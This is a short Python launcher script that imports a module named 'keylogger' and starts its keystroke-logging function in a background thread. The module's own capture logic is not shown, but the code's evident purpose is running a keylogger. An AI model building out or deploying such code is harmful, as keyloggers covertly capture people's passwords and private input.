from threading import Thread
import keylogger


init_keylogger=keylogger.keylogger_class()
thread_keylogger=Thread(target=init_keylogger.keylogger_funktion)
thread_keylogger.start()
